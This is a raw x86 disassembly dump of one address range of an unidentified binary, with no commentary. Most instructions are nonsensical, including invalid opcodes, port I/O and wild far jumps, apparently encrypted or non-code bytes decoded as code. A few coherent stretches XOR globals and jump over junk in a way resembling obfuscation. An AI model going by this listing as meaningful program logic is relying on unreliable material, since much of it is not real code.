  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4338a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	iret   
  408465:	into   
  408466:	mov    ds,ebx
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	out    dx,ax
  408472:	adc    esp,DWORD PTR [edx]
  408474:	popa   
  408475:	test   BYTE PTR [ebp-0x67],al
  408478:	iret   
  408479:	push   ds
  40847a:	pop    DWORD PTR [esi-0x3be195c6]
  408480:	add    DWORD PTR [ebx+0x76],eax
  408483:	outs   dx,DWORD PTR ds:[esi]
  408484:	nop
  408485:	add    BYTE PTR [ebp-0x3e5d2755],0x96
  40848c:	mov    ds:0x6006dbee,al
  408491:	test   edi,0x4b36007d
  408497:	and    al,0x21
  408499:	mov    ds:0x803a8874,al
  40849e:	cwde   
  40849f:	sub    BYTE PTR [edx+0x2ea69040],bh
  4084a5:	popf   
  4084a6:	adc    ah,BYTE PTR [ebp-0x5a521152]
  4084ac:	iret   
  4084ad:	xor    BYTE PTR [edx+0x43],bl
  4084b0:	(bad)  
  4084b1:	xor    al,0xfb
  4084b3:	mov    edi,0xcc1e71e0
  4084b8:	mov    dh,0x20
  4084ba:	mov    bh,0xd4
  4084bc:	aas    
  4084bd:	dec    esp
  4084be:	imul   esi,DWORD PTR [ecx],0x63
  4084c1:	mov    ds:0xa4ed5954,eax
  4084c6:	push   esp
  4084c7:	dec    esp
  4084c8:	stos   DWORD PTR es:[edi],eax
  4084c9:	sbb    bl,dh
  4084cb:	push   es
  4084cc:	and    eax,0xb775da53
  4084d1:	or     eax,0xdd7f5a0f
  4084d6:	jmp    0x20a225a7
  4084db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084dc:	mov    cl,0x37
  4084de:	mov    ds:0xac18cbdc,al
  4084e3:	inc    edi
  4084e4:	lods   eax,DWORD PTR ds:[esi]
  4084e5:	fistp  QWORD PTR ds:0xd31bd6d1
  4084eb:	sbb    eax,0xc828853
  4084f0:	(bad)  
  4084f1:	and    eax,0xd6120eca
  4084f6:	mov    eax,ds:0x7d9b9
  4084fb:	test   DWORD PTR [edi],esi
  4084fd:	push   es
  4084fe:	jns    0x40852c
  408500:	idiv   edx
  408502:	and    DWORD PTR [edx+0x7bf23f1],0xffffffa8
  408509:	jg     0x4084ed
  40850b:	es pushf 
  40850d:	addr16 in eax,dx
  40850f:	mov    ch,0x22
  408511:	loop   0x4084f1
  408513:	repnz cmp esp,DWORD PTR [edx+0x3c]
  408517:	and    esp,DWORD PTR [eiz*4+0x65d6cdd7]
  40851e:	leave  
  40851f:	call   0x250045d1
  408524:	push   esi
  408525:	icebp  
  408526:	and    al,dl
  408528:	pop    es
  408529:	mov    WORD PTR [edx-0x1a],ds
  40852c:	cmp    bh,cl
  40852e:	push   ebx
  40852f:	cdq    
  408530:	dec    edi
  408531:	fcmovu st,st(3)
  408533:	mov    BYTE PTR [edi],bl
  408535:	sbb    BYTE PTR ds:0xa64ca622,al
  40853b:	sahf   
  40853c:	jecxz  0x408532
  40853e:	pushf  
  40853f:	ds jge 0x4084cb
  408542:	jbe    0x4085ab
  408544:	pop    esp
  408545:	xchg   esi,eax
  408546:	jne    0x408508
  408548:	and    al,BYTE PTR [ebp+0x40]
  40854b:	push   edx
  40854c:	sbb    BYTE PTR [ebx-0x2e4a4f7a],0x7c
  408553:	sbb    DWORD PTR [ecx],0xffffffec
  408556:	mov    ch,0x89
  408558:	lods   al,BYTE PTR ds:[esi]
  408559:	lods   al,BYTE PTR ds:[esi]
  40855a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40855b:	lds    ecx,FWORD PTR ds:0x9dba96e1
  408561:	mov    al,ds:0x2bebcf2
  408566:	push   ebx
  408567:	mov    bh,0xb1
  408569:	in     al,dx
  40856a:	lahf   
  40856b:	and    bh,BYTE PTR [ecx+0x4039581a]
  408571:	test   BYTE PTR [edx],dh
  408573:	ins    DWORD PTR es:[edi],dx
  408574:	mov    fs:0x54d2e0e0,eax
  40857a:	mov    ds:0x8e537ece,al
  40857f:	pop    es
  408580:	into   
  408581:	sub    eax,0x7a8bf646
  408586:	dec    eax
  408587:	or     DWORD PTR [edx+eiz*8-0x6a],0xffffff87
  40858c:	jmp    0xf58:0xd3fbbed0
  408593:	dec    edx
  408594:	fild   DWORD PTR [eax+0x45]
  408597:	xchg   ebx,eax
  408598:	fild   DWORD PTR [ebp+edi*4+0xd40cd89]
  40859f:	shr    DWORD PTR [ecx+0x75],1
  4085a2:	push   0xfffffff9
  4085a4:	out    0x41,eax
  4085a6:	mov    BYTE PTR [esp+esi*4-0x5579c5d0],bh
  4085ad:	or     BYTE PTR [edi],dl
  4085af:	push   esp
  4085b0:	icebp  
  4085b1:	ret    
  4085b2:	mov    edi,0x437ac2d1
  4085b7:	push   es
  4085b8:	mov    esi,0x6df6057
  4085bd:	lock pop ecx
  4085bf:	jbe    0x408608
  4085c1:	xlat   BYTE PTR ds:[ebx]
  4085c2:	es sbb al,0xc5
  4085c5:	add    al,0xc3
  4085c7:	(bad)  
  4085c8:	cmp    dl,al
  4085ca:	pop    ebp
  4085cb:	shl    esi,1
  4085cd:	aaa    
  4085ce:	mov    al,ds:0x60dd9011
  4085d3:	outs   dx,DWORD PTR ds:[esi]
  4085d4:	dec    eax
  4085d5:	aam    0x17
  4085d7:	sub    ebp,eax
  4085d9:	frstor [eax-0x456c81c2]
  4085df:	or     ecx,DWORD PTR [edi+0x72586ec0]
  4085e5:	sub    esi,DWORD PTR [ecx]
  4085e7:	mov    dl,bh
  4085e9:	sbb    ecx,DWORD PTR [edx+edx*1]
  4085ec:	and    al,0xce
  4085ee:	jne    0x4085ce
  4085f0:	lods   eax,DWORD PTR ds:[esi]
  4085f1:	jnp    0x408658
  4085f3:	ja     0x408651
  4085f5:	push   edx
  4085f6:	aaa    
  4085f7:	cs sbb al,0x1a
  4085fa:	push   edx
  4085fb:	jp     0x408664
  4085fd:	ficomp WORD PTR [edx]
  4085ff:	and    DWORD PTR [edx-0x6f7b18b0],esp
  408605:	out    dx,al
  408606:	dec    eax
  408607:	add    ebx,DWORD PTR [edi-0x4c7b4a4c]
  40860d:	sbb    al,0x86
  40860f:	int    0x5e
  408611:	jne    0x408674
  408613:	jle    0x40863c
  408615:	fsubp  st(5),st
  408617:	mov    ds:0x76920293,eax
  40861c:	shr    BYTE PTR [esp+ecx*2],cl
  40861f:	cmp    al,0x2b
  408621:	sub    ebp,DWORD PTR [eax]
  408623:	test   eax,0xcb30ef67
  408628:	shl    DWORD PTR ds:0x4242f406,1
  40862e:	push   ebx
  40862f:	adc    cl,0xa4
  408632:	cmp    al,0x32
  408634:	fwait
  408635:	loop   0x4086a4
  408637:	push   edi
  408638:	push   ss
  408639:	stc    
  40863a:	jecxz  0x408646
  40863c:	(bad)  
  40863d:	(bad)  
  40863e:	jno    0x40868e
  408640:	les    eax,FWORD PTR [ebp+eiz*2-0x7e9a9b2e]
  408647:	sbb    bl,ch
  408649:	ret    
  40864a:	inc    eax
  40864b:	pop    ebp
  40864c:	std    
  40864d:	xlat   BYTE PTR ds:[ebx]
  40864e:	in     eax,0xeb
  408650:	repz pop edi
  408652:	adc    eax,0xd7b9630b
  408657:	pusha  
  408658:	ror    al,1
  40865a:	fwait
  40865b:	dec    ecx
  40865c:	jmp    0xf7e9:0x50848d9d
  408663:	scas   eax,DWORD PTR es:[edi]
  408664:	pushf  
  408665:	ss pop esi
  408667:	jbe    0x4085f1
  408669:	arpl   WORD PTR [ecx-0x76eb3233],dx
  40866f:	scas   al,BYTE PTR es:[edi]
  408670:	int    0xdc
  408672:	(bad)
  408675:	cmp    DWORD PTR [edi],0x8fc02241
  40867b:	pop    edx
  40867c:	sahf   
  40867d:	scas   al,BYTE PTR es:[edi]
  40867e:	and    dh,BYTE PTR [eax-0x43]
  408681:	call   0xcfd3511b
  408686:	jg     0x408660
  408688:	xor    eax,0xe96d3d6e
  40868d:	pop    edx
  40868e:	ja     0x40867f
  408690:	push   es
  408691:	mov    db3,ebp
  408694:	dec    ebp
  408695:	sub    bh,BYTE PTR [eax]
  408697:	mov    edx,0xb8bb8903
  40869c:	(bad)  
  40869d:	adc    cl,BYTE PTR [esi+0x37e31581]
  4086a3:	inc    ebx
  4086a4:	add    BYTE PTR [ebx+0x37],bh
  4086a7:	inc    ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	outs   dx,DWORD PTR ds:[esi]
  4086af:	cmp    BYTE PTR [ebx+0x0],al
  4086b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b3:	cmp    BYTE PTR [ebx+0x0],al
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x17d97b4a],ecx
  4086ca:	int3   
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	enter  0xe6f4,0x52
  4086d7:	push   edi
  4086d8:	loop   0x40866e
  4086da:	lock jnp 0x4086e4
  4086dd:	es aad 0x69
  4086e0:	push   ds
  4086e1:	cmc    
  4086e2:	jno    0x40874a
  4086e4:	lods   eax,DWORD PTR ds:[esi]
  4086e5:	sti    
  4086e6:	shl    BYTE PTR [edx+0x1],cl
  4086e9:	call   0x2cfc:0x5b82056c
  4086f0:	loopne 0x40872c
  4086f2:	cmp    cl,BYTE PTR [esi-0x66b861e4]
  4086f8:	pop    es
  4086f9:	daa    
  4086fa:	xor    al,0x6c
  4086fc:	cs pop ebp
  4086fe:	popa   
  4086ff:	mov    eax,0x3108bc53
  408704:	cmp    al,0xcb
  408706:	arpl   ax,di
  408708:	(bad)  
  408709:	mov    esp,0xffa88f9d
  40870e:	dec    ebp
  40870f:	xlat   BYTE PTR ds:[ebx]
  408710:	repz and ebx,DWORD PTR [ebx]
  408713:	pop    esi
  408714:	sbb    eax,0xa5c983c2
  408719:	jp     0x408740
  40871b:	mov    esi,esp
  40871d:	lea    ecx,[edx]
  40871f:	std    
  408720:	dec    ebx
  408721:	(bad)  
  408722:	push   0xd35e30ba
  408727:	add    al,0x64
  408729:	pop    edi
  40872a:	addr16 out 0xef,al
  40872d:	dec    esi
  40872e:	pushf  
  40872f:	pop    ebx
  408730:	pusha  
  408731:	sbb    dh,BYTE PTR [edi+0x1]
  408734:	out    0x20,eax
  408736:	xchg   esp,eax
  408737:	and    bh,BYTE PTR [ecx-0xb]
  40873a:	dec    edi
  40873b:	(bad)  
  40873c:	mov    DWORD PTR [esi-0x7d],ebx
  40873f:	mov    esi,ds
  408741:	cmp    ecx,DWORD PTR [esi]
  408743:	add    eax,0x558a92e8
  408748:	icebp  
  408749:	aas    
  40874a:	das    
  40874b:	mov    eax,ds:0xe9b9b45d
  408750:	adc    al,0xa0
  408752:	test   esi,ebx
  408754:	out    dx,eax
  408755:	cmp    al,0xf8
  408757:	inc    ebx
  408758:	daa    
  408759:	or     DWORD PTR es:[esi+eiz*4],ebx
  40875d:	sbb    al,0x2d
  40875f:	imul   ebx,DWORD PTR [eax],0x8eda1a62
  408765:	ror    DWORD PTR [ecx],0x78
  408768:	mov    ecx,0x3d722dd5
  40876d:	popa   
  40876e:	sub    eax,0x30eff778
  408773:	jmp    FWORD PTR [ebp+eiz*1+0x5afef1af]
  40877a:	icebp  
  40877b:	imul   ebp,edx,0x21
  40877e:	mov    eax,DWORD PTR [ebx+esi*1]
  408781:	jmp    0x40875c
  408783:	and    al,0x23
  408785:	inc    esi
  408786:	and    ah,BYTE PTR [eax]
  408788:	inc    ebx
  408789:	push   cs
  40878a:	push   ds
  40878b:	mov    bh,0x1
  40878d:	cmp    al,0x64
  40878f:	mov    esi,0xe8bc99e4
  408794:	aam    0xca
  408796:	loop   0x4087c2
  408798:	jae    0x40873e
  40879a:	mov    ecx,0x65819e3
  40879f:	mov    al,bh
  4087a1:	(bad)  
  4087a2:	xor    BYTE PTR [edi-0x10],bl
  4087a5:	out    0x27,al
  4087a7:	xchg   esi,eax
  4087a8:	(bad)  
  4087a9:	adc    DWORD PTR [edx+0x71283d34],ebx
  4087af:	out    dx,eax
  4087b0:	push   eax
  4087b1:	aad    0x55
  4087b3:	pop    esi
  4087b4:	fs fs sti 
  4087b7:	inc    eax
  4087b8:	outs   dx,BYTE PTR ds:[esi]
  4087b9:	fadd   DWORD PTR [ebx]
  4087bb:	ds sub eax,0x535d08b6
  4087c1:	jno    0x4087f7
  4087c3:	jb     0x40877b
  4087c5:	addr16 adc eax,0xca5559eb
  4087cb:	addr16 push 0xffffffc7
  4087ce:	les    esi,FWORD PTR [esi+ebp*4+0x27]
  4087d2:	outs   dx,DWORD PTR ds:[esi]
  4087d3:	cmp    al,0x3d
  4087d5:	adc    eax,0x8a0efa2b
  4087da:	popf   
  4087db:	inc    eax
  4087dc:	xchg   ebp,eax
  4087dd:	pop    esi
  4087de:	popf   
  4087df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087e0:	sbb    eax,0x5a46aa19
  4087e5:	lahf   
  4087e6:	and    DWORD PTR [ebp-0xf],ebp
  4087e9:	pop    esp
  4087ea:	(bad)  
  4087eb:	sub    esi,DWORD PTR [eax]
  4087ed:	int3   
  4087ee:	cmc    
  4087ef:	inc    ebx
  4087f0:	and    eax,0x1986b0e
  4087f5:	pop    ecx
  4087f6:	fsub   QWORD PTR [esi]
  4087f8:	inc    eax
  4087f9:	and    DWORD PTR [edi],ebx
  4087fb:	push   ecx
  4087fc:	popf   
  4087fd:	arpl   WORD PTR [edi+0x5423cb09],ax
  408803:	mov    al,ds:0xc76ff3fd
  408808:	xchg   esp,eax
  408809:	xlat   BYTE PTR ds:[ebx]
  40880a:	iret   
  40880b:	push   esi
  40880c:	out    dx,al
  40880d:	jle    0x408880
  40880f:	pop    eax
  408810:	adc    al,0x8a
  408812:	repnz stos DWORD PTR es:[edi],eax
  408814:	in     al,0xcb
  408816:	dec    eax
  408817:	addr16 loop 0x4087ef
  40881a:	ss inc edi
  40881c:	xchg   ebx,eax
  40881d:	pop    ebx
  40881e:	shl    BYTE PTR ds:0x4314c26,1
  408824:	(bad)  
  408825:	sub    al,0x4d
  408827:	or     ah,BYTE PTR fs:[esi+0x5d90f834]
  40882e:	fcomip st,st(4)
  408830:	iret   
  408831:	lods   al,BYTE PTR ds:[esi]
  408832:	mov    dh,0xe7
  408834:	cmp    bh,BYTE PTR [esi-0x6a398b7e]
  40883a:	test   eax,0x11462a97
  40883f:	iret   
  408840:	rcl    DWORD PTR [ecx-0x78506547],cl
  408846:	lea    edx,[esi+0x153e9165]
  40884c:	clc    
  40884d:	inc    ebx
  40884e:	lahf   
  40884f:	dec    edx
  408850:	push   esp
  408851:	pop    esi
  408852:	pop    ds
  408853:	mov    cl,BYTE PTR [ecx]
  408855:	fdivr  QWORD PTR [ebx-0x2]
  408858:	js     0x408867
  40885a:	inc    esi
  40885b:	ror    BYTE PTR [edi+0x47aa4fdf],1
  408861:	out    dx,al
  408862:	call   0x1ec4:0xd3768646
  408869:	(bad)  
  40886a:	fld    TBYTE PTR [esp+eiz*4]
  40886d:	lea    ebx,[ebx]
  40886f:	hlt    
  408870:	ins    DWORD PTR es:[edi],dx
  408871:	cli    
  408872:	sbb    al,0x62
  408874:	clc    
  408875:	imul   edi,esp,0x2c
  408878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408879:	nop
  40887a:	data16 jge 0x40887f
  40887d:	mov    edi,ds
  40887f:	lods   al,BYTE PTR ds:[esi]
  408880:	jp     0x408816
  408882:	in     eax,dx
  408883:	mov    ebx,0xc5eda32e
  408888:	and    DWORD PTR [esi+0x5d],esp
  40888b:	popa   
  40888c:	sub    BYTE PTR [ebp-0x6b7af777],ch
  408892:	out    dx,eax
  408893:	leave  
  408894:	push   ecx
  408895:	mov    edi,0xf1dbeb38
  40889a:	into   
  40889b:	loop   0x408912
  40889d:	push   edx
  40889e:	jg     0x408873
  4088a0:	adc    ch,BYTE PTR [ebx+0x5]
  4088a3:	dec    ecx
  4088a4:	enter  0x5f86,0xc1
  4088a8:	or     dh,ah
  4088aa:	(bad)  
  4088ab:	in     eax,0x3
  4088ad:	sub    cl,BYTE PTR [esp+ebx*4]
  4088b0:	fdiv   QWORD PTR [ecx]
  4088b2:	jle    0x408915
  4088b4:	iret   
  4088b5:	cmp    esi,DWORD PTR [eax-0x46c80483]
  4088bb:	jmp    0x3674:0xffc2a155
  4088c2:	pop    ebx
  4088c3:	adc    al,BYTE PTR [esi+edx*1-0x5ac5f8a2]
  4088ca:	or     esi,DWORD PTR [ebx]
  4088cc:	adc    DWORD PTR [eax],ebx
  4088ce:	mov    ah,0x8
  4088d0:	xor    al,0x1a
  4088d2:	sbb    ah,dl
  4088d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088d5:	outs   dx,BYTE PTR ds:[esi]
  4088d6:	addr16 xchg edi,eax
  4088d8:	add    al,0x77
  4088da:	xchg   esp,eax
  4088db:	pop    es
  4088dc:	pop    esp
  4088dd:	repnz imul ecx,DWORD PTR [esp+eiz*4+0x29e49f6d],0x93e05ecb
  4088e9:	std    
  4088ea:	or     eax,0xa96a1fb2
  4088ef:	inc    esp
  4088f0:	jbe    0x40895d
  4088f2:	(bad)  
  4088f3:	je     0x4088d7
  4088f5:	icebp  
  4088f6:	fist   WORD PTR [edx-0x18]
  4088f9:	pusha  
  4088fa:	dec    edx
  4088fb:	inc    eax
  4088fc:	retf   
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x4337e3,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x43385b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4337d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43379f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4338a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x6fb39f2c
  408968:	int3   
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	pop    esi
  408972:	add    bx,WORD PTR [esi]
  408975:	ins    BYTE PTR es:[edi],dx
  408976:	xchg   edi,eax
  408977:	mov    cl,0x19
  408979:	mov    ds:0x10fe7721,eax
  40897e:	inc    esp
  40897f:	dec    ebp
  408980:	mov    ch,0xce
  408982:	push   edi
  408983:	adc    al,0x27
  408985:	pop    esp
  408986:	adc    BYTE PTR [edi+0x2b],al
  408989:	push   0xffffffb3
  40898b:	std    
  40898c:	and    dh,BYTE PTR [ebx]
  40898e:	scas   al,BYTE PTR es:[edi]
  40898f:	std    
  408990:	jge    0x4089d9
  408992:	mov    DWORD PTR [esi*2-0x71b68909],esi
  408999:	lods   eax,DWORD PTR ds:[esi]
  40899a:	push   ebx
  40899b:	jns    0x4089f8
  40899d:	fld    TBYTE PTR [ebx+0x183907b8]
  4089a3:	jae    0x40892a
  4089a5:	fidiv  DWORD PTR [esi-0x7b]
  4089a8:	add    BYTE PTR [esi+0x254ce065],cl
  4089ae:	dec    esp
  4089af:	xchg   edx,eax
  4089b0:	in     al,0xe1
  4089b2:	mov    dl,0x10
  4089b4:	adc    ebx,edi
  4089b6:	adc    BYTE PTR ds:0x9f023c1,al
  4089bc:	in     eax,0xc9
  4089be:	or     cl,BYTE PTR ds:0x411d95a4
  4089c4:	gs mov ch,0x2f
  4089c7:	div    bl
  4089c9:	(bad)  
  4089ca:	aad    0x30
  4089cc:	ss or  eax,0x9141a127
  4089d2:	jbe    0x4089a0
  4089d4:	push   edx
  4089d5:	(bad)
  4089d9:	and    al,0xb8
  4089db:	cli    
  4089dc:	jmp    0x408977
  4089de:	dec    esp
  4089df:	jg     0x408999
  4089e1:	dec    eax
  4089e2:	mov    eax,ds:0xf2150f5d
  4089e7:	pop    ss
  4089e8:	push   cs
  4089e9:	(bad)  
  4089ea:	push   edx
  4089eb:	aam    0xad
  4089ed:	cmp    ecx,esi
  4089ef:	inc    edi
  4089f0:	adc    bh,dl
  4089f2:	jne    0x4089b2
  4089f4:	fild   QWORD PTR [esi]
  4089f6:	pop    ds
  4089f7:	cwde   
  4089f8:	hlt    
  4089f9:	out    dx,eax
  4089fa:	ret    
  4089fb:	xor    eax,esp
  4089fd:	sbb    DWORD PTR [edi-0x647cda0a],edi
  408a03:	push   es
  408a04:	adc    esp,DWORD PTR ds:0x3c07f1d0
  408a0a:	push   ss
  408a0b:	clc    
  408a0c:	pop    ds
  408a0d:	sbb    al,0x3f
  408a0f:	fcom   st(1)
  408a11:	push   edx
  408a12:	xchg   esi,eax
  408a13:	mov    eax,ds:0x528b39f3
  408a18:	and    al,0x8b
  408a1a:	jp     0x408a3d
  408a1c:	jecxz  0x408a21
  408a1e:	push   ss
  408a1f:	(bad)  
  408a20:	sub    ebp,DWORD PTR [esi]
  408a22:	inc    edi
  408a23:	jae    0x408a4e
  408a25:	adc    eax,0xe4b068e1
  408a2a:	(bad)  
  408a2b:	loopne 0x4089e5
  408a2d:	shr    BYTE PTR [esi-0x6560efd2],cl
  408a33:	into   
  408a34:	push   cs
  408a35:	cmc    
  408a36:	jp     0x408a7e
  408a38:	sahf   
  408a39:	ficom  WORD PTR [ebx+0x39e1ae6c]
  408a3f:	sar    BYTE PTR [esi-0x17f010ce],cl
  408a45:	aad    0xba
  408a47:	das    
  408a48:	pop    ebp
  408a49:	test   al,0xa2
  408a4b:	shr    BYTE PTR [eax-0x7292a6ef],1
  408a51:	xlat   BYTE PTR ds:[ebx]
  408a52:	daa    
  408a53:	inc    ebp
  408a54:	fwait
  408a55:	sbb    al,0xe5
  408a57:	outs   dx,DWORD PTR ds:[esi]
  408a58:	inc    esi
  408a59:	inc    ebx
  408a5a:	dec    eax
  408a5b:	cld    
  408a5c:	xor    al,0x4d
  408a5e:	xchg   ebp,eax
  408a5f:	imul   edx,DWORD PTR [ecx+0x480bbc3d],0x52c57980
  408a69:	test   al,0x50
  408a6b:	and    DWORD PTR [eax+0x41],ecx
  408a6e:	and    al,0x35
  408a70:	shl    esp,0xdf
  408a73:	dec    ebp
  408a74:	in     eax,dx
  408a75:	pop    eax
  408a76:	rcr    BYTE PTR [ecx+0x58],0x7c
  408a7a:	rcr    BYTE PTR [esi+0x54],cl
  408a7d:	adc    esi,DWORD PTR [ecx+0x33067cfd]
  408a83:	loopne 0x408a70
  408a85:	fstp   DWORD PTR [ebx+0x781921d0]
  408a8b:	nop
  408a8c:	pop    eax
  408a8d:	pop    ebp
  408a8e:	clc    
  408a8f:	sbb    cl,BYTE PTR [ecx]
  408a91:	push   edi
  408a92:	call   0xb9528742
  408a97:	leave  
  408a98:	(bad)  
  408a99:	mov    BYTE PTR [edx-0x7104b2b],al
  408a9f:	(bad)  
  408aa0:	ficomp DWORD PTR [ecx]
  408aa2:	add    BYTE PTR [esi+0x12],0xaa
  408aa6:	push   ebx
  408aa7:	aad    0x7
  408aa9:	imul   edx,DWORD PTR [ecx-0x22],0x29
  408aad:	adc    ch,BYTE PTR [edi+edx*1+0x2e6dbf65]
  408ab4:	and    edi,DWORD PTR [eax-0x57]
  408ab7:	rol    bl,cl
  408ab9:	daa    
  408aba:	(bad)  
  408abb:	dec    esp
  408abc:	(bad)  
  408abd:	fs test al,0x3d
  408ac0:	mov    esi,0x77373026
  408ac5:	xchg   ecx,eax
  408ac6:	push   eax
  408ac7:	add    al,0x7e
  408ac9:	cld    
  408aca:	mov    esp,0x3a245859
  408acf:	and    cl,BYTE PTR [esi]
  408ad1:	icebp  
  408ad2:	hlt    
  408ad3:	jmp    0x392b33bc
  408ad8:	fisubr DWORD PTR ds:[edi-0x1]
  408adc:	push   edx
  408add:	cmp    eax,0x7a607402
  408ae2:	and    bl,BYTE PTR [esi+0x1a]
  408ae5:	aad    0xc4
  408ae7:	sti    
  408ae8:	dec    edi
  408ae9:	pop    edi
  408aea:	cmc    
  408aeb:	cmp    DWORD PTR [edi-0x7e],ebp
  408aee:	mov    ds:0x106fb71c,eax
  408af3:	pop    edi
  408af4:	or     eax,0x9b3e8ef3
  408af9:	test   BYTE PTR [esi],bh
  408afb:	lahf   
  408afc:	dec    esi
  408afd:	sti    
  408afe:	add    eax,0x36382b97
  408b03:	mov    ecx,0xf87c3db4
  408b08:	mov    dh,0x2
  408b0a:	jmp    edi
  408b0c:	(bad)  
  408b0d:	fnstenv [ecx+0x5d]
  408b10:	int3   
  408b11:	leave  
  408b12:	sub    al,0x9
  408b14:	fidiv  DWORD PTR ds:0x414dd29b
  408b1a:	sar    BYTE PTR [ebx+eiz*8+0x12],cl
  408b1e:	pxor   mm6,QWORD PTR [edi+0x4e]
  408b22:	jp     0x408b52
  408b24:	push   0x8
  408b26:	rcl    DWORD PTR [ebp+0x26],cl
  408b29:	jmp    0x20f0a0d6
  408b2e:	add    ebp,DWORD PTR [ecx+0x1d]
  408b31:	popa   
  408b32:	cmp    dh,BYTE PTR [ebx-0x7f]
  408b35:	mov    al,0x52
  408b37:	cmp    ch,al
  408b39:	shr    DWORD PTR [ecx-0x39],1
  408b3c:	add    BYTE PTR ds:0xa2669195,al
  408b42:	sbb    al,0x3b
  408b44:	and    bl,BYTE PTR [esi-0xb]
  408b47:	xchg   esi,eax
  408b48:	add    DWORD PTR [ebx],edi
  408b4a:	xchg   DWORD PTR [ebp+0x346f7440],edi
  408b50:	stc    
  408b51:	mov    dh,0xc6
  408b53:	stos   BYTE PTR es:[edi],al
  408b54:	xchg   edi,eax
  408b55:	scas   eax,DWORD PTR es:[edi]
  408b56:	mov    ecx,0xd789dbe6
  408b5b:	adc    cl,0x17
  408b5e:	mov    ds:0x32119bb6,eax
  408b63:	push   0xc225be2a
  408b68:	std    
  408b69:	gs aam 0x59
  408b6c:	and    ebp,DWORD PTR [ecx-0x6eef4a55]
  408b72:	jne    0x408b0e
  408b74:	lds    esp,FWORD PTR [ecx+0x1]
  408b77:	sub    dl,BYTE PTR [esi-0x198da6c]
  408b7d:	sub    eax,0xdfe9f2f9
  408b82:	cmp    eax,0xdf49ceae
  408b87:	mov    ch,0x80
  408b89:	es (bad) 
  408b8b:	mov    ch,0xc4
  408b8d:	push   cs
  408b8e:	and    al,0x7c
  408b90:	adc    DWORD PTR [eax+0x157cc152],0x26
  408b97:	pop    ebp
  408b98:	or     ah,BYTE PTR [eax+0x1d850fb3]
  408b9e:	add    BYTE PTR [eax],al
  408ba0:	add    BYTE PTR [ebx+0x4d8b0845],cl
  408ba6:	lock xor eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	loop   0x408b73
  408bf2:	inc    edx
  408bf3:	mov    dh,0x66
  408bf5:	sar    BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	pop    ds
  408bfd:	and    BYTE PTR [ebx-0x20],0x47
  408c01:	out    dx,eax
  408c02:	cmp    al,BYTE PTR [ebp+0x8c3ef85]
  408c08:	stos   DWORD PTR es:[edi],eax
  408c09:	call   FWORD PTR [esi-0x6e]
  408c0c:	gs hlt 
  408c0e:	int3   
  408c0f:	test   eax,0xfbc0f326
  408c14:	fwait
  408c15:	add    eax,0xcfd59bf3
  408c1a:	test   eax,0x6a4fe855
  408c1f:	das    
  408c20:	inc    ebx
  408c21:	jo     0x408c6c
  408c23:	es add eax,0xf59975d3
  408c29:	xor    eax,0x38d8fe52
  408c2e:	jno    0x408be5
  408c30:	gs popf 
